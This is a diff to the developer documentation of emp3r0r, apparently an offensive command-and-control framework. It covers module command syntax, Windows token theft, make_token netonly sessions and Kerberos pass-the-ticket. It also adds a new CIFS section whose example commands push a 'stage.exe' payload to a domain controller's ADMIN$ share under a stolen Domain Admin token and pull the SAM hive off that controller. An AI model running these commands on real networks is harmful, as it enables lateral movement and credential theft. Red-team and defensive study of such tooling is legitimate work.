@@ -296,7 +296,9 @@ When the emp3r0r C2 starts, it parses the modules via `InitModules` in `core/int
 1. **Discovery:** Scans `modules/*` directories for `config.json` files.
 2. **Validation:** Unmarshals the JSON. If there are duplicate parameter names, reserved flags (`force`, `help`), or schema errors, it throws a warning and skips the module.
 3. **Registration:** Stores the valid module into the `def.Modules` memory map.
-4. **Execution:** When the operator runs your module, `moduleCustom` reads the operator's input, validates it against your `parameters`, packs it according to the `type` aliases, and dispatches the task down to the agent memory for fileless execution.
+4. **Execution:** Each registered module becomes its **own top-level console command** (see `addModuleCommands` in `core/internal/cc/operator/mod_cmd.go`), with one `--flag` per parameter, e.g. `sa_whoami --pid 1234`, `cifs_download --src \\DC01\C$\Windows\system32\config\SAM --dest mem:///SAM --token <SID>`. Flag defaults come from `config.json`; values are read per-invocation and never written back into the shared config.
+
+> ⚠️ **There is no `use` / `set` / `run` module console anymore** (removed long ago). Do not document operators typing `use <module>`, `set <option> <value>`, or a bare `run`. Any doc, comment, `usage()` text or example that shows that flow is stale — rewrite it as `module_name --option value ...`.
 
 _Note: For BOFs, only the arch-matching file from the `files` list is executed (e.g. only the `.x64.o` when the target is amd64). For starlark modules, `files[0]` is the entry point and the rest are memfs companion files (see `agent_config.files` above)._
 
@@ -380,6 +382,8 @@ All memory reading primitives safely access unmanaged memory addresses across Wi
 | `http_post`                                | `(url, content_type, body)`  | Performs HTTP POST request and returns body content string.                                |
 | `exec_cmd`                                 | `(cmd, args=[])`             | Executes shell command with optional argument string list. Returns combined output string. |
 | `crypto_hash`                              | `(algo, data)`               | Computes hash (`"md5"`, `"sha1"`, `"sha256"`) of `data`.                                   |
+| `bytes_to_b64` / `b64_to_bytes`            | `(data)` / `(b64)`           | Binary-safe base64 round-trip for `bytes`/string values (builtins in `core/lib/script/api_bytes.go`). |
+| `write_bytes`                              | `(path, data)`               | Writes `bytes`/string binary-safely to a local or `mem:///` path via the agent's file writer.      |
 
 #### F. Predeclared Global Variables
 
@@ -396,18 +400,18 @@ emp3r0r supports stealing Windows access tokens from running processes and using
 
 | Command                             | Description                                                                                                                 |
 | ----------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
-| `!steal_token --pid <PID>`          | Steal the primary token from a process and cache it. Enables `SeDebugPrivilege` and `SeImpersonatePrivilege` automatically. |
-| `!list_tokens`                      | List all cached tokens (DOMAIN\\User + SID).                                                                                |
-| `!make_token --user <USER> ...`     | Create a **netlogon logon session** for a domain user using a dummy password (see §6.8).                                   |
-| `!list_sessions`                    | List all netlogon logon sessions created by `make_token`.                                                                  |
-| `!import_ticket --session <NAME> ...` | Import a base64 KRB-CRED (.kirbi) Kerberos ticket into a session's logon session (see §6.8).                              |
+| `steal_token --pid <PID>`          | Steal the primary token from a process and cache it. Enables `SeDebugPrivilege` and `SeImpersonatePrivilege` automatically. |
+| `list_tokens`                      | List all cached tokens (DOMAIN/User + SID).                                                                                |
+| `make_token --user <USER> ...`     | Create a **netlogon logon session** for a domain user using a dummy password (see §6.8).                                   |
+| `list_sessions`                    | List all netlogon logon sessions created by `make_token`.                                                                  |
+| `import_ticket --session <NAME> ...` | Import a base64 KRB-CRED (.kirbi) Kerberos ticket into a session's logon session (see §6.8).                              |
 
 Every module registered via `config.json` automatically receives three universal parameters:
 
 | Parameter    | Meaning                                                                                                                 |
 | ------------ | ----------------------------------------------------------------------------------------------------------------------- |
-| `--token`    | SID of a stolen token (`!list_tokens`) **or** a make_token session name (`!list_sessions`) to impersonate.               |
-| `--user`     | Create/reuse a make_token netlogon session for this user (`DOMAIN\\user` or plain) and run the module under it.          |
+| `--token`    | SID of a stolen token (`list_tokens`) **or** a make_token session name (`list_sessions`) to impersonate.               |
+| `--user`     | Create/reuse a make_token netlogon session for this user (`DOMAIN/user` or plain) and run the module under it.          |
 | `--ticket`   | Base64 KRB-CRED (.kirbi) to import into the module's logon session (the `--token`/`--user` session, or the current one). |
 
 `--user` is ignored when `--token` is set. If a module declares its own `user`/`ticket` parameter in `config.json`, that declaration wins and the universal meaning is disabled for that module.
@@ -480,6 +484,7 @@ See these reference implementations:
 | `core/modules/SA/whoami.star`           | Full token inspection: user, groups, privileges. Thread-token-first fallback. |
 | `core/modules/injection/thread_inject.star` | Remote thread injection under the operator-selected token.          |
 | `core/modules/SA/get_dpapi_system.star` | Checking token elevation before attempting LSA secret extraction.             |
+| `core/modules/cifs/cifs.star` | SMB/CIFS file upload/download/deletion to and from agent-less hosts under a stolen token or an imported Kerberos ticket. |
 
 ### 6.5 COFF (BOF) Modules and Tokens
 
@@ -506,7 +511,7 @@ No changes are needed in the BOF source code.
 
 ### 6.7 Privilege Requirements
 
-`!steal_token` automatically enables:
+`steal_token` automatically enables:
 
 - `SeDebugPrivilege` — required to open handles to most processes (especially SYSTEM-level).
 - `SeImpersonatePrivilege` — required to set thread tokens and spawn children via `CreateProcessWithTokenW`.
@@ -517,14 +522,14 @@ If the agent does not hold these privileges (e.g. running as a low-privilege use
 
 Thread impersonation alone is not enough for Kerberos: `ptt`, `asktgt /ptt`, `klist`, … talk to LSA and are bound to a **logon session** (the `AuthenticationId`/LUID registered in LSASS), not to a token. BOFs/starlark modules are token-aware, so without a matching logon session ticket imports fail (`STATUS_ACCESS_DENIED`/`0xC0000022` or the ticket simply not showing up in `klist`).
 
-`make_token` solves this by creating a **netlogon (new-credentials) logon session**:
+`make_token` solves this by creating a **netonly netlogon (new-credentials) logon session** (the same primitive Cobalt Strike's `make_token` / `runas /netonly` use):
 
 ```
 make_token --user jdoe --domain corp.local --password dummy --name jdoe
 # → session name: jdoe, logon LUID: 0x12345678
 ```
 
-Internally it calls `LogonUserW(user, domain, dummy_password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50)`, which registers a brand-new logon session in LSASS — no valid password is required. The session is cached agent-side (`priv.SessionMap`) and its token is registered in `priv.TokenMap` under the session name, so **the universal `--token <session>` parameter works for any BOF/starlark module**.
+Internally it calls `LogonUserW(user, domain, any_password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50)`, which registers a brand-new logon session in LSASS. **The password is never validated** — any value (or none) works. Because this is a *new-credentials* (netonly) logon, the session token keeps the **calling user's local identity** (`whoami` is unchanged) and the supplied credentials are used only for outbound network connections; what the session gives you is a fresh `AuthenticationId` (LUID) that Kerberos tickets can be bound to. The session is cached agent-side (`priv.SessionMap`) and its token is registered in `priv.TokenMap` under the session name, so **the universal `--token <session>` parameter works for any BOF/starlark module**.
 
 Typical Kerberos workflow:
 
@@ -541,14 +546,34 @@ The universal `--user`/`--ticket` options let you skip the manual two-step setup
 ```
 kerbeus_klist --user jdoe --ticket <base64 TGT> --token jdoe
 # or, session created on the fly (no --token needed):
-kerbeus_klist --user CORP.LOCAL\jdoe --ticket <base64 TGT>
+kerbeus_klist --user CORP.LOCAL/jdoe --ticket <base64 TGT>
 ```
 
 Notes:
 
-- `!import_ticket --luid <hex> --ticket <b64>` targets an explicit logon session LUID (as printed by `list_sessions`); importing into a session owned by another user requires SYSTEM.
-- `!list_tokens` also shows make_token sessions (annotated with `[make_token session]`), and the `--token`/`--session` completers offer both SIDs and session names.
+- After `import_ticket`, outbound network access (SMB shares, RPC, …) under the session authenticates **with the imported Kerberos ticket** — this is the pass-the-ticket flow: `make_token` is the container, the ticket is the identity. Without an imported ticket, network access falls back to the netonly credentials (a dummy password then yields `ERROR_LOGON_FAILURE (1326)` on network resources, as with Cobalt Strike's `make_token`).
+- `whoami`/token-identity BOFs still report the *current* user: the netonly token's SID never changes (PTT changes network identity, not the token SID) — exactly as with Cobalt Strike's `make_token`/`ptt`.
+- `import_ticket --luid <hex> --ticket <b64>` targets an explicit logon session LUID (as printed by `list_sessions`); importing into a session owned by another user requires SYSTEM.
+- `list_tokens` also shows make_token sessions (annotated with `[make_token session]`), and the `--token`/`--session` completers offer both SIDs and session names.
 - The session token is an impersonation duplicate of the logon token; it remains valid until the agent exits or the session is recreated under the same name.
+
+### 6.9 CIFS/SMB Uploads/Downloads to Agent-less Hosts
+
+On a domain-joined host with a Domain Admin logged in (or a DA token/ticket available in the agent session) you can push files to machines that run **no agent at all** — straight over their `ADMIN$`/`C$`/… shares — as long as the DA identity has access. This is the `cifs_upload` starlark module (same script also provides `cifs_download` for pulling files back and `cifs_rm` for cleanup):
+
+```
+cifs_upload --src mem:///stage.exe --dest \\DC01\ADMIN$\Temp\stage.exe \
+            --token S-1-5-21-...-1104        # DA token stolen via steal_token
+# …or PTT with a ticket:
+cifs_upload --user CORP.LOCAL/da --ticket <base64 KRB-CRED .kirbi> \
+            --src mem:///stage.exe --dest \\DC01\ADMIN$\Temp\stage.exe
+```
+
+`--src` may be a `mem:///` file staged on the agent (CC `put`/`file_downloader`), an agent-local path, or an `http(s)://` URL. How it works: the script is pure Win32 file I/O — `CreateFileW("\\target\\ADMIN$\\...")` + chunked `WriteFile` over the UNC path. Every `win_call` impersonates the module's token, so the SMB redirector opens a session for the stolen identity; with a `make_token` session the network identity is the imported Kerberos ticket (pass-the-ticket over SMB). No agent, no `net use`, no credentials on the target — the ticket/token already present in the agent session is all that is needed for CIFS access. Pair with `scshell` to execute the uploaded file on the target (service-control lateral movement under the same token context).
+
+The `cifs_download` module is the pull half: it streams a remote file back over the share (`CreateFileW(GENERIC_READ)` + chunked `ReadFile`, bytes pulled out with `win_read_mem` and saved through the binary-safe `write_bytes` helper) into `mem:///` (retrieve with CC `get`) or a local path — e.g. `cifs_download --src \\DC01\C$\Windows\system32\config\SAM --dest mem:///SAM --token <DA token>`. `--verify true` re-reads the file and compares hashes to detect mid-transfer changes. Downloads run under the same token/ticket context as uploads.
+
+The `cifs_rm` module is the cleanup half of the trio: it removes a remote file or an empty directory (`cifs_rm --dest \\DC01\ADMIN$\Temp\stage.exe` / `--rmdir true`) over the share under the same token/ticket context (`DeleteFileW`/`RemoveDirectoryW`, verified by re-opening the path).
 
 ---
 
